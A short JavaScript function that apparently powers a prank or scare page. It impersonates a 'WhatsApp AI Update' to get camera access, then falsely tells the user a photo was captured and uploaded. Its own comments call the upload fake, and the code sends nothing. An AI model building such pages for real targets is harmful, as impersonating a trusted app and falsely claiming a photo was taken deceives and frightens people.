async function startScan() {
    const video = document.getElementById('video');
    const statusText = document.getElementById('status-text');
    const overlay = document.getElementById('overlay');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        statusText.innerText = "Aligning Biometrics... 0%";

        setTimeout(() => {
            // 1. The "Flash" effect
            document.body.style.backgroundColor = "white";
            
            // 2. The "Capture" Moment
            setTimeout(() => {
                document.body.style.backgroundColor = "#0b141a"; // Reset background
                statusText.innerText = "PHOTO CAPTURED! Sending to Server...";
                statusText.style.color = "yellow";
                
                // 3. The "Fake Upload" delay
                setTimeout(() => {
                    overlay.style.display = 'flex';
                    statusText.innerText = "Upload Complete. Check your messages!";
                    statusText.style.color = "#ff3b3b";
                }, 2000);
            }, 100);
        }, 3000); // Happens 3 seconds after they start

    } catch (err) {
        alert("Camera access is required for the WhatsApp AI Update.");
    }
}
